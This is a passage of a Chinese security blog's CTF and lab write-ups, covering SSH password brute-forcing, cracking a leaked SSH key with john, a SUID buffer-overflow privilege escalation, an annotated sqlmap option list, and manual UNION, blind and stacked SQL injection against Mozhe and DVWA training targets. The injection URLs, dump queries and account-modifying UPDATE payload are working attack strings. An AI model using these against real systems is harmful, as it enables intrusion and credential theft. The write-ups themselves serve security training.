auxiliary/scanner/ssh/ssh_login 显示配置项 show options 1msf5 auxiliary(scanner/ssh/ssh_login) &gt; show option 配置相关选项 12345678910msf5 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 192.168.0.107RHOSTS =&gt; 192.168.0.107msf5 auxiliary(scanner/ssh/ssh_login) &gt; set USERNAME hadiUSERNAME =&gt; hadimsf5 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE hadi.txtPASS_FILE =&gt; hadi.txtmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set THREADS 10THREADS =&gt; 10msf5 auxiliary(scanner/ssh/ssh_login) &gt; show options msf5 auxiliary(scanner/ssh/ssh_login) &gt; run 破解出密码 根据提示，打开session会话 打开的session会话，交互模式不是很好利用python进行优化 1python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot; 提升权限，查看flag]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SSH私钥泄露]]></title>
    <url>%2F2019%2F08%2F07%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SSH%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2%2F</url>
    <content type="text"><![CDATA[Background SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。 靶场环境靶机convfefe ：192.168.0.109攻击机Kali ： 192.168.0.104 信息探测先进行ip的探测 1root@kali:~# netdiscover -r 192.168.0.0/24 服务探测知道了IP，探测一下靶机目标开放了那些服务 1root@kali:~# nmap -sV 192.168.0.109 发现开放了2个http服务和一个ssh服务；http服务可以通过网页的形式访问 访问页面，没有发现可用信息；有时候可以通过网页源代码发现一点可用的信息，但是这里没有发现可用信息 http隐藏文件探测网页源代码没有发现可用的信息，这里我们可用使用工具探测一下该服务隐藏文件 1root@kali:~# dirb http://192.168.0.109:31337/ 发现了一些敏感文件(robots.txt，.ssh) 右键打开链接robots协议不允许访问这些文件目录那我们就尝试访问一下 发现了第一个flag：flag1{make_america_great_again} 同样我们可以打开.ssh文件发现了ssh的公钥、私钥 （SSH下autho…） 将其文件下载至本地（如访问.ssh/id_rsa的形式进行下载）id_rsa是私钥，authorized_keys是认证关键字（包含公钥），公钥可不用下载 下载下来后，我们需要修改私钥的权限，不然无法连接靶机ssh-key 登录 要求私钥文件 属性必须是400 600 不能他人访问权限 1root@kali:~/test# chmod 600 id_rsa ssh连接还需要用户名，这里可以查看authorized_keys文件 ssh连接1root@kali:~/test# ssh -i id_rsa simon@192.168.0.109 // -i 私钥文件 发现还需要一个密码 解密ssh密钥信息用ssh2john 将id_isa密钥信息转换为john可以识别的信息因为我的kali上没有找到该工具，所以在john官方工具里找到它的脚本 1root@kali:~/test# ../tools/ssh2john.py id_rsa &gt; rsacrack 利用字典破解 1root@kali:~/test# zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules rsacrack 破解出来密码是starwars 再次连接 打开root根目录，发现一个flag文件，和一个c语言程序 12simon@covfefe:/root$ lsflag.txt read_message.c 查看flag文件，不过没有权限 12simon@covfefe:/root$ cat flag.txt cat: flag.txt: Permission denied 这里可以用find命令查找具有权限的文件 1234567891011121314simon@covfefe:/root$ find / -perm -4000 2&gt;/dev/null // -perm -4000 具有权限 2&gt;/dev/null 避免错误/usr/bin/chsh/usr/bin/passwd/usr/bin/chfn/usr/bin/gpasswd/usr/bin/newgrp/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/local/bin/read_message/bin/umount/bin/su/bin/mount/bin/ping 查看c语言的代码 12345678910111213141516171819202122232425#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;// You're getting close! Here's another flag:// flag2&#123;use_the_source_luke&#125;int main(int argc, char *argv[]) &#123; char program[] = "/usr/local/sbin/message"; char buf[20]; char authorized[] = "Simon"; printf("What is your name?\n"); gets(buf); // Only compare first five chars to save precious cycles: if (!strncmp(authorized, buf, 5)) &#123; printf("Hello %s! Here is your message:\n\n", buf); // This is safe as the user can't mess with the binary location: execve(program, NULL, NULL); &#125; else &#123; printf("Sorry %s, you're not %s! The Internet Police have been informed of this violation.\n", buf, authorized); exit(EXIT_FAILURE); &#125;&#125; 很幸运，在代码的注释中发现了flag2：flag2{use_the_source_luke} 缓冲区溢出对代码进行审计;程序通过用户输入的值的前5位进行判断如果匹配结果为Simon，则通过函数execve执行program数组中的内容 因为我们输入的值是保存在一个20字节的数组中，可以考虑溢出提权 这里我们获得了root权限，可以查看flag文件 第三个flag：flag3{das_bof_meister}]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLMAP自动注入]]></title>
    <url>%2F2019%2F08%2F02%2FSQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[sqlmap是一款非常强大的开源sql自动化注入工具，可以用来检测和利用sql注入漏洞【动态页面中get/post参数、cookie、HTTP头】。它由Python语言开发而成，因此运行需要安装python环境。但在kali中已经集成。其功能完善，有强大的引擎，适用几乎所有数据库，，可自动进行数据榨取，也可对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行操作系统命令），还可以做XSS漏洞检测。 五种漏洞检测技术 基于布尔的盲注检测 基于时间的盲注检测 ‘ and (select * from (select(sleep(20)))a)– 基于错误的检测 基于UNION联合查询的检测 适用于通过循环直接输出联合查询结果，否则只显示第一项结果 基于堆叠的检测 ；堆叠多个查询语句 适用于非select的数据修改、删除操作 支持的数据库 MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase , SAP MaxDB 其他特性 数据库直接连接 -d 不通过SQL注入，制定身份认证信息、IP、端口 与burpsuite、google结合使用，支持正则表达式限定测试目标 Get、post、cookie、Referer、User-Agent（随机或指定） Cookie过期后自动处理Set-Cookie头，更新cookie信息 限速：最大并发、延迟发送 支持Basic，Digest，NTLM，CA身份认证 数据库版本、用户、权限、hash枚举和字典破解、暴力破解表列名称 文件上传下载、UDF\启动并执行存储过程、操作系统命令执行、访问windows注册表 与W3af、metasploit集成结合使用，基于数据库服务进程提权和上传执行后门 SQLMAP安装更新12345sqlmap --update git clone https://github.com/sqlmapproject/sqlmap.gitgit pull 参数详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269 ___ __H__ ___ ___[&quot;]_____ ___ ___ &#123;1.2.7.28#dev&#125;|_ -| . [(] | .&apos;| . ||___|_ [&quot;]_|_|_|__,| _| |_|V |_| http://sqlmap.orgUsage: sqlmap.py [options]Options: -h, --help Show basic help message and exit -hh Show advanced help message and exit --version Show program&apos;s version number and exit -v VERBOSE Verbosity level: 0-6 (default 1) Target: // 目标 At least one of these options has to be provided to define the target(s) -d DIRECT Connection string for direct database connection // 连接数据库 -u URL, --url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;) // 指定url -l LOGFILE Parse target(s) from Burp or WebScarab proxy log file // 指定相关日志文件 -x SITEMAPURL Parse target(s) from remote sitemap(.xml) file // 指定站点体贴 -m BULKFILE Scan multiple targets given in a textual file // 指定保存多个url的文件 -r REQUESTFILE Load HTTP request from a file // 指定包含http头部的url的文件(可用于post方法) -g GOOGLEDORK Process Google dork results as target URLs -c CONFIGFILE Load options from a configuration INI file // 将命令保存文件，然后指定执行 Request: // 请求 These options can be used to specify how to connect to the target URL --method=METHOD Force usage of given HTTP method (e.g. PUT) --data=DATA Data string to be sent through POST //指定传递参数（POST） --param-del=PARA.. Character used for splitting parameter values //变量分隔符 --cookie=COOKIE HTTP Cookie header value --cookie-del=COO.. Character used for splitting cookie values --load-cookies=L.. File containing cookies in Netscape/wget format --drop-set-cookie Ignore Set-Cookie header from response //忽略网页响应的新cookies --user-agent=AGENT HTTP User-Agent header value --random-agent Use randomly selected HTTP User-Agent header value //随机User-Agent --host=HOST HTTP Host header value //指定host名称 --referer=REFERER HTTP Referer header value //指定referer头 -H HEADER, --hea.. Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;) --headers=HEADERS Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;) //指定请求头部信息（参数用\n分隔） --auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI) //用于HTTP协议认证 --auth-cred=AUTH.. HTTP authentication credentials (name:password) --auth-file=AUTH.. HTTP authentication PEM cert/private key file // 用于客户端认证 --ignore-code=IG.. Ignore HTTP error code (e.g. 401) --ignore-proxy Ignore system default proxy settings --ignore-redirects Ignore redirection attempts --ignore-timeouts Ignore connection timeouts --proxy=PROXY Use a proxy to connect to the target URL // 指定代理服务器 --proxy-cred=PRO.. Proxy authentication credentials (name:password) --proxy-file=PRO.. Load proxy list from a file --tor Use Tor anonymity network --tor-port=TORPORT Set Tor proxy port other than default --tor-type=TORTYPE Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default)) --check-tor Check to see if Tor is used properly --delay=DELAY Delay in seconds between each HTTP request //http(s)请求之间得延迟时间，单位秒 --timeout=TIMEOUT Seconds to wait before timeout connection (default 30) // 超时时间 --retries=RETRIES Retries when the connection timeouts (default 3) // 重试次数 --randomize=RPARAM Randomly change value for given parameter(s) //指定请求需要随机值的参数，如id --safe-url=SAFEURL URL address to visit frequently during testing --safe-post=SAFE.. POST data to send to a safe URL --safe-req=SAFER.. Load safe HTTP request from a file --safe-freq=SAFE.. Test requests between two visits to a given safe URL --skip-urlencode Skip URL encoding of payload data // 跳过url的编码 --csrf-token=CSR.. Parameter used to hold anti-CSRF token --csrf-url=CSRFURL URL address to visit to extract anti-CSRF token --force-ssl Force usage of SSL/HTTPS // 使用https协议 --hpp Use HTTP parameter pollution method // 使用HTTP参数污染方法 ，绕过WAF/IPS/IDS的有效方法 --eval=EVALCODE Evaluate provided Python code before the request (e.g. // 利用代码修改url中的参数值 &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;) Optimization: //优化性能 These options can be used to optimize the performance of sqlmap -o Turn on all optimization switches // 开启以下三个参数，除--threads --predict-output Predict common queries output // 根据返回值和和统计表内容，不断缩小检测范围，提高效率 （与--thread参数不兼容） --keep-alive Use persistent HTTP(s) connections //使用http(s)长连接,减小开销 与--proxy不兼容 --null-connection Retrieve page length without actual HTTP response body //只获取返回页面的大小 ，而非内容常用于盲注，与--text-only不兼容 --threads=THREADS Max number of concurrent HTTP(s) requests (default 1) // 并发线程数 Injection: // 注入 These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts -p TESTPARAMETER Testable parameter(s) // 指定扫描的参数 --skip=SKIP Skip testing for given parameter(s) // 跳过指定参数的扫描 --skip-static Skip testing parameters that not appear to be dynamic --param-exclude=.. Regexp to exclude parameters from testing (e.g. &quot;ses&quot;) --dbms=DBMS Force back-end DBMS to provided value // 指定扫描目标扫描的数据库类型版本 --dbms-cred=DBMS.. DBMS authentication credentials (user:password) // 指定数据库账号密码 --os=OS Force back-end DBMS operating system to provided value //指定扫描目标的操作系统 --invalid-bignum Use big numbers for invalidating values // 使用大的数字使参数失效，如id=99999999 --invalid-logical Use logical operations for invalidating values //使用逻辑操作使参数失效 --invalid-string Use random strings for invalidating values // 使用随机字符串使参数失效 --no-cast Turn off payload casting mechanism // 关闭有效载荷释放机制 // 榨取数据时，sqlmap将所有结果转换为字符串，并用空格代替NULL结果 // 在老版本mysql数据库需要开启此开关 --no-escape Turn off string escaping mechanism // 关闭字符串转义机制 --prefix=PREFIX Injection payload prefix string // 在payload前面加前缀 --suffix=SUFFIX Injection payload suffix string // 在payload前面加后缀 --tamper=TAMPER Use given script(s) for tampering injection data // 使用脚本注入，常用于绕过WAF，IDS Detection: // 检测 These options can be used to customize the detection phase --level=LEVEL Level of tests to perform (1-5, default 1) // 检测级别 （/usr/share/sqlmap/xml/payloads） --risk=RISK Risk of tests to perform (1-3, default 1) // 风险级别 --string=STRING String to match when query is evaluated to True //查询计算为True时要匹配的字符串 --not-string=NOT.. String to match when query is evaluated to False //查询计算为False时要匹配的字符串 --regexp=REGEXP Regexp to match when query is evaluated to True //当查询被评估为True时匹配的正则表达式 --code=CODE HTTP code to match when query is evaluated to True //查询评估为True时要匹配的HTTP代码 --text-only Compare pages based only on the textual content //仅根据文本内容比较页面 --titles Compare pages based only on their titles //仅根据标题比较页面 Techniques: // 技术 These options can be used to tweak testing of specific SQL injection techniques --technique=TECH SQL injection techniques to use (default &quot;BEUSTQ&quot;) //指定扫描的技术（如报错、时间等） --time-sec=TIMESEC Seconds to delay the DBMS response (default 5) //基于时间注入的延时 --union-cols=UCOLS Range of columns to test for UNION query SQL injection //联合查询的列数 --union-char=UCHAR Character to use for bruteforcing number of columns // 指定联合查询时的数值，默认NULL --union-from=UFROM Table to use in FROM part of UNION query SQL injection --dns-domain=DNS.. Domain name used for DNS exfiltration attack --second-url=SEC.. Resulting page URL searched for second-order response // 响应的结果在另一个url页面中 --second-req=SEC.. Load second-order HTTP request from file Fingerprint: -f, --fingerprint Perform an extensive DBMS version fingerprint \\ 查询数据库版本，操作系统，架构等 Enumeration: // 枚举 These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements -a, --all Retrieve everything // 检索一切 -b, --banner Retrieve DBMS banner // 查询数据库的banner信息（数据库版本） --current-user Retrieve DBMS current user //当前数据库用户 --current-db Retrieve DBMS current database // 当前使用的数据库 --hostname Retrieve DBMS server hostname // 查询主机名 --is-dba Detect if the DBMS current user is DBA --users Enumerate DBMS users // 查询数据库用户 --passwords Enumerate DBMS users password hashes --privileges Enumerate DBMS users privileges // 枚举用户的权限信息（-U 指定用户 -CU 当前用户） --roles Enumerate DBMS users roles --dbs Enumerate DBMS databases // 枚举当前所有的数据库 --tables Enumerate DBMS database tables --columns Enumerate DBMS database table columns --schema Enumerate DBMS schema // 枚举元数据库中的信息 --count Retrieve number of entries for table(s) --dump Dump DBMS database table entries // 将枚举的信息存储下来 --dump-all Dump all DBMS databases tables entries --search Search column(s), table(s) and/or database name(s) --comments Check for DBMS comments during enumeration -D DB DBMS database to enumerate -T TBL DBMS database table(s) to enumerate -C COL DBMS database table column(s) to enumerate -X EXCLUDE DBMS database identifier(s) to not enumerate // -U USER DBMS user to enumerate // 指定用户 --exclude-sysdbs Exclude DBMS system databases when enumerating tables --pivot-column=P.. Pivot column name --where=DUMPWHERE Use WHERE condition while table dumping --start=LIMITSTART First dump table entry to retrieve // 通过start和stop参数选择查询的数据量（行数） --stop=LIMITSTOP Last dump table entry to retrieve0 --first=FIRSTCHAR First query output word character to retrieve --last=LASTCHAR Last query output word character to retrieve --sql-query=QUERY SQL statement to be executed --sql-shell Prompt for an interactive SQL shell --sql-file=SQLFILE Execute SQL statements from given file(s) Brute force: // 暴力破解 These options can be used to run brute force checks --common-tables Check existence of common tables // 破解表名称 --common-columns Check existence of common columns // 破解列名称 User-defined function injection: // 用户自定义函数注入 These options can be used to create custom user-defined functions --udf-inject Inject custom user-defined functions --shared-lib=SHLIB Local path of the shared library File system access: These options can be used to access the back-end database management system underlying file system --file-read=RFILE Read a file from the back-end DBMS file system // 读取目标系统文件 --file-write=WFILE Write a local file on the back-end DBMS file system // 写文件 --file-dest=DFILE Back-end DBMS absolute filepath to write to // 上传文件存储的位置（目标地址） Operating system access: // 操作系统访问 These options can be used to access the back-end database management system underlying operating system --os-cmd=OSCMD Execute an operating system command //执行cmd命令 --os-shell Prompt for an interactive operating system shell //提示输入交互式操作系统shell --os-pwn Prompt for an OOB shell, Meterpreter or VNC --os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC --os-bof Stored procedure buffer overflow exploitation --priv-esc Database process user privilege escalation --msf-path=MSFPATH Local path where Metasploit Framework is installed --tmp-path=TMPPATH Remote absolute path of temporary files directory Windows registry access: // windows注册表访问 These options can be used to access the back-end database management system Windows registry --reg-read Read a Windows registry key value --reg-add Write a Windows registry key value data --reg-del Delete a Windows registry key value --reg-key=REGKEY Windows registry key --reg-value=REGVAL Windows registry key value --reg-data=REGDATA Windows registry key value data --reg-type=REGTYPE Windows registry key value type General: These options can be used to set some general working parameters -s SESSIONFILE Load session from a stored (.sqlite) file // 指定会话文件存放位置 -t TRAFFICFILE Log all HTTP traffic into a textual file // 指定流量文件存放位置 --batch Never ask for user input, use the default behavior // 所有提示都用默认选项 --binary-fields=.. Result fields having binary values (e.g. &quot;digest&quot;) --check-internet Check Internet connection before assessing the target --crawl=CRAWLDEPTH Crawl the website starting from the target URL // 爬取信息，指定爬取深度 --crawl-exclude=.. Regexp to exclude pages from crawling (e.g. &quot;logout&quot;) --csv-del=CSVDEL Delimiting character used in CSV output (default &quot;,&quot;) //指定csv文件数据的分隔符 --charset=CHARSET Blind SQL injection charset (e.g. &quot;0123456789abcdef&quot;) // 强制字符编码 --dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE) --encoding=ENCOD.. Character encoding used for data retrieval (e.g. GBK) --eta Display for each output the estimated time of arrival --flush-session Flush session files for current target // 清空会话数据 --forms Parse and test forms on target URL --fresh-queries Ignore query results stored in session file // 忽略session查询结果 --har=HARFILE Log all HTTP traffic into a HAR file --hex Use hex conversion during data retrieval 以16进制进行数据传输 --output-dir=OUT.. Custom output directory path // 指定输出目录 --parse-errors Parse and display DBMS error messages from responses // 分析数据库内建报错信息 --save=SAVECONFIG Save options to a configuration INI file // 编辑配置文件 --scope=SCOPE Regexp to filter targets from provided proxy log //从日志文件通过正则表达式过滤目标 --test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW) --test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK) --update Update sqlmap Miscellaneous: // 杂项 -z MNEMONICS Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;) // 参数助记符 --alert=ALERT Run host OS command(s) when SQL injection is found --answers=ANSWERS Set question answers (e.g. &quot;quit=N,follow=N&quot;) --beep Beep on question and/or when SQL injection is found --cleanup Clean up the DBMS from sqlmap specific UDF and tables --dependencies Check for missing (non-core) sqlmap dependencies --disable-coloring Disable console output coloring --gpage=GOOGLEPAGE Use Google dork results from specified page number --identify-waf Make a thorough testing for a WAF/IPS/IDS protection // waf/ips/ids的彻底检测 --list-tampers Display list of available tamper scripts --mobile Imitate smartphone through HTTP User-Agent header // 模拟成手机发送请求 --offline Work in offline mode (only use session data) --purge Safely remove all content from sqlmap data directory //安全地从sqlmap数据目录中删除所有内容 --skip-waf Skip heuristic detection of WAF/IPS/IDS protection --smart Conduct thorough tests only if positive heuristic(s) // 只选择基于错误的检测结果 --sqlmap-shell Prompt for an interactive sqlmap shell --tmp-dir=TMPDIR Local directory for storing temporary files --web-root=WEBROOT Web server document root directory (e.g. &quot;/var/www&quot;) --wizard Simple wizard interface for beginner users // 注入向导]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[墨者-SQL手工注入漏洞测试(Access数据库)]]></title>
    <url>%2F2019%2F07%2F30%2F%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-Access%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[Background 安全工程师”墨者”最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境IIS+ASP+Access，Aspx代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。 存在漏洞的链接 1http://mozhe.cn/new_list.asp?id=1 注入点检测基于报错的检测1http://mozhe.cn/new_list.asp?id=1&apos; 页面返回不正常，可能存在SQL注入 基于布尔的检测12http://mozhe.cn/new_list.asp?id=1 and 1=1http://mozhe.cn/new_list.asp?id=1 and 1=2 通过页面结果，该链接确实存在SQL注入漏洞 判断selet字段数12http://mozhe.cn/new_list.asp?id=1 order by 4 //显示正常http://mozhe.cn/new_list.asp?id=1 order by 5 //显示不正常 判断出select中有4个字段数 猜解数据库的表名1http:/mozhe.cn/new_list.asp?id=1 union select 1,2,3,4 from table1 可以通过手动或自动化工具更换‘table1’，猜解存在的表名发现admin表 并且发现显示的字段位置在2，3 猜解数据库列名1http://mozhe.cn/new_list.asp?id=1 union select 1,2,3,4 from admin 将任意一个数字更换成列名，如果列名存在，则正常显示有时候，可以直接得到表中的数据 发现username、id、passwd等列字段 爆出账号密码1http://mozhe.cn/new_list.asp?id=1 union select 1,username,passwd,4 from admin 账号：moke密码：7e6ec4fadf84938f 密码是md5加密，通过在线破解后，就可以登陆后台拿到key值]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[墨者-SQL手工注入漏洞测试(MySQL数据库)]]></title>
    <url>%2F2019%2F07%2F29%2F%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[Background 安全工程师”墨者”最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。 检测SQL注入点发现一个维护公告链接 基于报错的检测先在链接后的id=1加入 ‘，查看页面反应发现页面没有任何显示，可能存在SQL注入 基于布尔值判断12http://mozhe.cn/new_list.php?id=1 and 1=1 正常显示http://mozhe.cn/new_list.php?id=1 and 1=2 不正常显示 那么可以判段存在SQL注入 判断select字段个数12http://mozhe.cn/new_list.php?id=1 order by 4http://mozhe.cn/new_list.php?id=1 order by 5 当order by语句中数值大于4，页面不显示，说明select语句中有4个字段 查询数据库信息先判断页面中会显示的字段位置 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2,3,4 判断出2，3字段的位置会在页面显示，因此可以开始构造sql语句了 查询数据库名，版本 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,database(),version(),4 数据库名：mozhe_Discuz_StormGroup版本： 5.7.22-0ubuntu0.16.04.1 这里也可以用CONCAT_WS函数 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),4 获取数据库名1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,table_schema,4 from information_schema.tables limit 1,1 通过修改limit值获得所有数据库名称获得5个数据库名称information_schema、 mozhe_Discuz_StormGroup、 mysql、 performance_schmozhe.cn 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,table_name,4 from information_schema.tables where table_schema=&apos;mozhe_Discuz_StormGroup&apos; limit 0,1 mozhe_Discuz_StormGroup库的表名：StormGroup_member、 notice 获取数据库列名1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,column_name,4 from information_schema.columns where table_schema=&apos;mozhe_Discuz_StormGroup&apos; and table_name=&apos;StormGroup_member&apos; limit 0,1 StormGroup_member表的列名： id、 name、 password、 status 获取字段内容（账号密码）1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,name,password,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 0,1 账号密码（MD5在线破解）mozhe 356f589a7df439f6f744ff19bb8092c0 —-dsan13mozhe c0b11cc529cd469efe3c3333e2bcc3db —-346753 登陆后台获取key]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘漏洞-SQL盲注（四）]]></title>
    <url>%2F2019%2F07%2F27%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[SQL盲注 SQL盲注：不显示数据库内建的报错信息【内建的报错信息帮助开发人员发现和修复问题】，但由于报错信息中提供了关于系统的大量有用信息。当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，SQL注入将无法依据报错信息判断注入语句的执行结果，即为盲注。 思路:既然无法基于报错信息判断结果，那就基于逻辑真假的不同结果来判断 SQL注入判断基本的布尔值判断 121&apos; and 1=1 -- // True 有回显 或 显示正常1&apos; and 1=2 -- // False 无回显 或 报错 当布尔值为真，有显示内容，布尔值为假，无回显基于这样判断，很可能存在SQL注入漏洞 推测select字段数121&apos; order by 2 -- // 判断select语句中的列字段个数1&apos; order by 3 -- 当order by 后的num 大于select中的字段数，无回显如上当num值为2时，还有回显，num大于2时，无回显，说明select语句中查询的字段数为2个因此后续就可以利用union select语句查询想要的信息 查询数据库11' union select null, CONCAT_WS(CHAR(32,58,32), user(), database(), version()) -- // 查询mysql用户，数据库名，数据库版本 11' union select null, table_name from information_schema.tables -- // 查询元数据库中的所有表名 11' and 1=0 union select null,table_name from information_schema.columns where table_name='users' # // 查询是否有users这张表 猜解数据库12' or user='admin 12' or user like '%a% 猜账号密码12' or user='admin' and password='5f4dcc3b5aa765d61d8327deb882cf99 【BurpSuite自动化】 另类猜解当遇到网页不显示任何从数据库中提取的信息，只有页面风格画面的转换 12and 1=1 -- 显示 页面1and 1=2 -- 显示 页面2 此时，常见注入工具可能无法发现漏洞可以尝试构造语句，手工注入或编写脚本 11' and ORD(MID((version()),1,1))&amp;128&gt;0 -- 函数： ORD() ：把函数中的字符转换成ASCII码 MID(ColumnName, Start [, Length]) ：截取字符串 ORD(string)&amp;128 ：将转换的ASCII数值于128(二进制：10000000)进行与运算； 如果运算结果大于0，说明第一位数值为1（从左往右） 如果运算结果等于0，说明第一位数值为0 依次计算（1，2，4，8，16，32，64，128）,判断每一位的二进制数值 然后将计算到的二进制值转成十进制，反向计算出ASCII值【注】：键盘可输入的ASCII值只有128位 通过判断有无回显，间接猜出想要的信息以下以判断数据库名为例通过以上的回显进行判断,有回显置1 1231' and ORD(MID((database()),1,1))&amp;128&gt;0 -- 128 64 32 16 8 4 2 1b 0 1 1 0 0 1 0 0 计算出ASCII值为100，即字符 ‘d’后面字符的猜解，只需修改截取的位置 11' and ORD(MID((database()),2,1))&amp;128&gt;0 -- 通过多次猜解，就可以得到数据库名 ‘dvwa’； 12345671' and ORD(MID((database()),n,1))&amp;128&gt;0 -- n 128 64 32 16 8 4 2 1 ascii(DEC)1 0 1 1 0 0 1 0 0 -----100--------d2 0 1 1 1 0 1 1 0 -----118--------v3 0 1 1 1 0 1 1 1 -----100--------w4 0 1 1 0 0 0 0 1 ------97--------a]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘漏洞-SQL注入（三）]]></title>
    <url>%2F2019%2F07%2F25%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一般情况下，information_schema表只有root用户，或者被授权的用户才能访问；如果数据库管理员是用普通用户启用mysql服务，可能就无权限访问，不过可以通过注入的sql语句，观察网页回显，猜解数据库、表名、字段。 由上图，我们可以得知mysql的权限为root权限，知道为root权限，就能通过information_schema表获得我们想要的信息 我们也可以通过猜解的方式，获取信息 猜列名1' and column is null -- 替换sql语句中的‘column’，判断网页回显sql语句的意思是 ：并且列有一个字段为空；（如果列名存在，网页不会有回显；列名不存在，网页报错）eg. burpsuite字典猜解选择替换字段的位置字典的选择，可以再kali里搜索，猜解字段的有效程度，取决于字典的质量可以通过以下命令将字典拷贝出来，并且过滤一些#开头的字段 1root@kali:~# cat /usr/share/golismero/tools/sqlmap/txt/common-columns.txt | grep -v ^# &gt; columns.txt 载入字典开始攻击通过返回的长度，判断字段是否存在 猜解表名1' and table.user is null -- user是为确认存在的列字段，目的是判断‘table’这张表中是否存在user字段（如果表名存在，网页不会有回显；表名不存在，网页报错） 查找字典 1root@kali:~# cat /usr/share/golismero/tools/sqlmap/txt/common-tables.txt | grep -v ^# &gt; tables.txt 通过返回的消息长度，判断该表是否存在 猜解其他表名1' and (select count(*) from abc)&gt;0 -- 统计表中记录，若大于0，表名存在，可能直接爆出库名和表名 猜解表列的关系1' and users.user is null -- 判断users表中是否有user列 猜解字段内容 判断user列中是否有admin字段（后面为真，则显示，证明该内容存在） 1' or user='admin 猜解user列中包含a的所有字段（通配符，只要字段中包含a，则显示） 1' or user like '%a% 猜解账号密码1' or user='admin' and password='5f4dcc3b5aa765d61d8327deb882cf99 数据库写入当我们获得足够的数据库权限，可以对数据库写入时，可以增加或修改账号密码，来获得更多的信息 1'; update users set user='new_admin' where user='admin 